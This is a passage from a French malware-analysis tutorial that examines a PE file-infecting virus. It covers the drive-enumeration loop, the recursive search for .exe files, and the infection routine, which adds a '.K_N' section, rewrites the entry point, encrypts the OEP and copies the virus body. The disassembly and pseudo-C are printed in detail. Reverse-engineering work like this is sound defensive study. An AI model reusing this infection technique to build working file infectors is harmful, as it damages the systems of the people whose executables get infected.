								<p>Finalement, le tableau des lecteurs rempli par <b>ZwQueryInformationProcess</b> est parcouru jusqu'à tomber sur un octet nul précisant l'abscence de lecteur. La boucle recherche la présence de lecteurs de type <b>DRIVE_FIXED</b>, correspondant aux disques durs puis pour chacun, appelle la fonction <b>SearchFiles</b> en passant le chemin en paramètre (<i>C:, D: etc</i>).</p>
								<div class="border" id="border">
								<span><span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D5</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">inc</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D6</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jmp</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> IsDrivePresent<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D6</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D8</span> TestDrive<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: Thread+8A</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010D8</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">movzx</span> &nbsp;&nbsp;<span class="S8">ecx</span><span class="S4">,</span> <span class="S10">byte</span> <span class="S9">ptr</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>lpPath<span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Au 1er passage, ecx = 'C' = 43h</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010DC</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">sub</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">ecx</span><span class="S4">,</span> <span class="S12">'A'</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ecx = 2</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010DF</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">movzx</span> &nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S8">ss</span><span class="S4">:[</span><span class="S8">ecx</span><span class="S4">+</span><span class="S8">ebp</span><span class="S4">+</span>DeviceMapInfo.DriveType<span class="S4">]</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010E5</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Sauvegarde pour tester la présence en 4010FA</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010E6</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">cmp</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> DRIVE_FIXED &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Vérifie que le lecteur courant est un disque dur</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010E9</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jnz</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> NextDrive<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010E9</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010EB</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S2">4</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; reserved</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010ED</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">lea</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>lpPath<span class="S4">]</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F0</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;&nbsp;&nbsp;<span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; lpPath</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F1</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;&nbsp;&nbsp;SearchFiles<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F6</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F6</span> NextDrive<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: Thread+77</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F6</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">inc</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S10">byte</span> <span class="S9">ptr</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>lpPath<span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Lettre suivante</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010F9</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FA</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FA</span> IsDrivePresent<span class="S4">:</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; CODE XREF: Thread+64</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FA</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">or</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S8">eax</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FC</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">jnz</span> &nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">short</span> TestDrive<br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FC</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FE</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">leave</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FF</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">retn</span> &nbsp;&nbsp;&nbsp;<span class="S2">4</span><br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FF</span> <br />
								<span class="S10">.text</span><span class="S4">:</span><span class="S2">004010FF</span> Thread &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S9">endp</span><br />
								</span>								
								</div>
								<p>La variable lpPath a été initialisée au début de la fonction avec la chaine <span class="S12">"C:"</span>. La boucle commence donc avec le 3<sup>ème</sup> lecteur. Je n'ai pas identifié le rôle du 2<sup>ème</sup> paramètre (4) passé à <b>SearchFiles</b>, celui-ci n'étant jamais utilisé dans la fonction.</p>
								<p class="Warning"><img src="Images/Warning.png" alt="Warning" />La boucle ne teste pas tous les lecteurs. Uniquement à partir de C: jusqu'à ce que la lettre ne corresponde à aucun lecteur (<i>DriveType = 0</i>). Cela signifie que si le système possède les lecteurs C:, D: &amp; G:, le dernier ne sera pas scanné.</p>								
						</li>		
<a name="FSearch"></a>	<div class="SommaireR"><a href="Index.html">Retour au sommaire</a></div>		
	 					<li><span class="TitreSSChap">Recherche des fichiers à infecter</span>
								<p>La fonction <b>SearchFiles</b> est très simple. Je ne vais donc pas la copier ici (<i>Vous trouverez la fonction analysée et commentée dans l'IDB</i>). On a vu qu'elle reçoit une lettre de lecteur en paramètre. Elle va y ajouter <span class="S12">"\*"</span> pour lister tous les fichiers présents dans le dossier courant à l'aide d'une boucle utilisant <b>FindFirstFile / FindNextFile</b> (<i>exemple : C:\*</i>). Les fichiers commençant par un <span class="S12">'.'</span> sont ignorés.</p>
								<p>Pour chaque fichier récupéré, le programme teste ses attributs pour voir si c'est un dossier. Dans ce cas, le nom du dossier est ajouté au chemin courant puis la fonction s'appelle elle-même avec ce nouveau chemin (<i>exemple : C:\WINNT\*</i>).</p>
								<p>Si un fichier est trouvé, le programme vérifie que son extension est <span class="S12">".exe"</span> et dans ce cas, appelle la fonction InfectFile (<b>int __stdcall InfectFile(int PathFileName,int cFileName);</b>). Elle prend 2 arguments : le chemin du dossier courant et le nom du fichier.</p>
						</li>			
<a name="Infect"></a>	<div class="SommaireR"><a href="Index.html">Retour au sommaire</a></div>		
	 					<li><span class="TitreSSChap">Infection du fichier</span>
								 <p>Pour une meilleure lisibilité et un gain de place, voici un résumé de la structure de la fonction en pseudo C :</p>
								 <div class="border" id="border">
								 			<span><span class="S0"></span><br />
								 			<span class="S5">int</span><span class="S0"> </span>__stdcall<span class="S0"> </span>InfectFile<span class="S10">(</span><span class="S5">int</span><span class="S0"> </span>Path<span class="S10">,</span><span class="S5">int</span><span class="S0"> </span>cFileName<span class="S10">)</span><span class="S0"> </span><span class="S10">{</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>strcpy<span class="S10">(</span>TempPath<span class="S10">,</span><span class="S0"> </span>Path<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>lstrcat<span class="S10">(</span>TempPath<span class="S10">,</span><span class="S0"> </span>cFileName<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>BaseAddress<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>OpenAndMapFile<span class="S10">(</span>TempPath<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S5">if</span><span class="S0"> </span><span class="S10">(!</span>IsValidPE<span class="S10">(</span>BaseAddress<span class="S10">))</span><span class="S0"> </span><span class="S10">{</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span>FreeMappedFile<span class="S10">();</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S5">return</span><span class="S0"> </span><span class="S4">0</span><span class="S10">;</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S10">}</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>MemAlloc<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>VirtuallAlloc<span class="S10">(</span><span class="S4">0</span><span class="S10">,</span><span class="S0"> </span><span class="S4">4096</span><span class="S10">,</span><span class="S0"> </span>MEM_COMMIT<span class="S10">,</span><span class="S0"> </span>PAGE_READWRITE<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>AddSection<span class="S10">(</span>BaseAddress<span class="S10">,</span><span class="S0"> </span>MemAlloc<span class="S10">,</span><span class="S0"> </span>TempPath<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>FreeMappedFile<span class="S10">();</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>BaseAddress<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>OpenAndMapFile<span class="S10">(</span>TempPath<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S2">// Copie du virus dans la nouvelle section</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S2">// ...</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>VirtualFree<span class="S10">(</span>MemAlloc<span class="S10">,</span><span class="S0"> </span><span class="S4">0</span><span class="S10">,</span><span class="S0"> </span>MEM_RELEASE<span class="S10">);</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span>FreeMappedFile<span class="S10">();</span><br />
											<span class="S0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="S5">return</span><span class="S0"> </span><span class="S4">1</span><span class="S10">;</span><br />
											<span class="S10">}</span></span>								 
								 </div>		
								 <p>D'abord, le chemin du fichier est déterminé à partir des 2 paramètres de la fonction (<i>Path et cFileName</i>), puis le résultat est passé en argument de la fonction <b>OpenAndMapFile</b>. Puis <b>IsValidPE</b> vérifie que le fichier est un PE correct en testant les signatures du DosHeader et du PEHeader. Ensuite, la fonction <b>AddSection</b> ajoute une section (<i>qui va contenir le virus</i>) au fichier et modifie le PEHeader. Finalement, le fichier est démappé puis remappé pour enregistrer les modifications et le virus est copié dans la nouvelle section.</p>
								 <ol type="a">
								 		 <li><span class="TitreSSChap">OpenAndMapFile</span>
										 <p>Cette fonction ouvre le fichier en lecture/écriture avec l'api <b>CreateFileA</b> et récupère sa taille avec <b>GetFileSize</b> pour vérifier qu'elle est supérieure à 4096 octets. Si le fichier est plus petit, il n'est pas infecté et la fonction quitte. Finalement, les apis <b>CreateFileMappingA</b> &amp; <b>MapViewOfFile</b> sont utilisées pour mapper son contenu dans l'espace mémoire du processus.</p>				
										 <p>La fonction renvoit 3 valeurs : le handle (<i>CreateFileA</i>) dans <span class="S8">eax</span>, le maphandle (<i>CreateFileMappingA</i>) dans <span class="S8">ebx</span> et l'adresse de base du fichier (<i>MapViewOfFile</i>) dans <span class="S8">ecx</span>.</p>								 
										 </li>
										 <li><span class="TitreSSChap">AddSection</span>
										 <p>Cette fonction va préparer le fichier à recevoir le code du virus. D'abord le nombre de section est incrémenté, puis la fonction vérifie le nom de la dernière section. S'il est égal à <span class="S12">".K_N"</span>, le fichier est déjà infecté et la fonction quitte. Sinon une nouvelle section est crée avec les valeurs suivantes : </p>
										 <ul>
										 		 <li><u>Nom</u> - <span class="S12">".K_N"</span></li>
												 <li><u>VSize</u> - <span class="S2">00000892</span></li>
												 <li><u>VOffset</u> - VOffset+VSize de la section précédente ajustée au SectionAlignment</li>
												 <li><u>RSize</u> - <span class="S2">0892</span> ajusté au FileAlignment</li>
												 <li><u>ROffset</u> - ROffset+RSize de la section précédente</li>
												 <li><u>Characteristics</u> - <span class="S2">E0000020</span></li>
												 <li>0 pour les 4 autres DWORD</li>
										 </ul>
										 </p>
										 <p>Ensuite, la nouvelle SizeOfImage est enregistrée avec la somme VOffset+VSize de la nouvelle section. Puis le nouvel EntryPoint est également inscrit en ajoutant 4 au VOffset de la section. Finalement, un nombre d'octets ègal à la RSize est alloué avec <b>VirtualAlloc</b> pour être ajoutés à la fin du fichier à l'aide de <b>WriteFile</b>.</p>								 
										 <p class="Warning"><img src="Images/Warning.png" alt="Warning" />Le virus nous donne là sa signature, à savoir que la dernière section doit se nommer <span class="S12">".K_N"</span>. On remarquera que le virus s'infectera lui-même puisque sa dernière section se nomme <span class="S12">"ZeGun1"</span>.</p>
										 </li>
										 <li><span class="TitreSSChap">Copie du code du virus</span>
										 <p>La fonction FreeMappedFile se contente de fermer les Handles précédemment ouverts par la fonction OpenAndMapFile. Le fait de démapper un fichier en mémoire enregistre définitivement les modifications.</p>
										 <p>Le code qui suit va d'abord crypter l'<acronym title="OriginalEntryPoint">OEP</acronym> du fichier infecté puis l'enregistrer au début de la section du virus. Enfin, la fonction va calculer l'adresse de début du code pour copier le virus dans la section du fichier.</p>
										 <div class="border" id="border">
										 <span><span class="S10">.text</span><span class="S4">:</span><span class="S2">0040135C</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;<span class="S8">edi</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>BaseAddress<span class="S4">]</span> &nbsp;<span class="S1">; ImageBase du fichier mappé</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401362</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;<span class="S8">esi</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">ebp</span><span class="S4">+</span>MemAlloc<span class="S4">]</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401368</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;<span class="S8">edi</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">esi</span><span class="S4">+</span><span class="S2">10h</span><span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ROffset de la nouvelle section</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">0040136B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">esi</span><span class="S4">+</span><span class="S2">14h</span><span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; AddressOfOriginalEntryPoint</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">0040136E</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S4">[</span><span class="S8">esi</span><span class="S4">+</span><span class="S2">18h</span><span class="S4">]</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; ImageBase</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401371</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">bswap</span> <span class="S8">eax</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401373</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">ror</span> &nbsp;&nbsp;<span class="S8">eax</span><span class="S4">,</span> <span class="S2">0Ah</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Crypt OEP</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401376</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;<span class="S4">[</span><span class="S8">edi</span><span class="S4">],</span> <span class="S8">eax</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Début de la section = OEP crypté</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401378</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">add</span> &nbsp;&nbsp;<span class="S8">edi</span><span class="S4">,</span> <span class="S2">4</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; edi = Début du code du virus dans la nouvelle section mappée</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">0040137B</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">push</span> &nbsp;<span class="S8">edi</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">0040137C</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">mov</span> &nbsp;&nbsp;<span class="S8">ecx</span><span class="S4">,</span> <span class="S2">892h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Taille du virus</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401381</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">call</span> &nbsp;<span class="S10">$</span><span class="S4">+</span><span class="S2">5</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401386</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">pop</span> &nbsp;&nbsp;<span class="S8">esi</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; esi = 00401386</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">00401387</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">sub</span> &nbsp;&nbsp;<span class="S8">esi</span><span class="S4">,</span> <span class="S2">382h</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; esi = EntryPoint du virus</span><br />
										 <span class="S10">.text</span><span class="S4">:</span><span class="S2">0040138D</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S6">repe</span> <span class="S6">movsb</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1">; Copie le code de la section dans le fichier infecté</span></span>
										 </div>
										 
										 </li>
								 </ol>
						</li>																		
				</ol>
<br />
<div class="Sommaire"><a href="Index.html">Retour au sommaire</a></div>


</body>
</html>
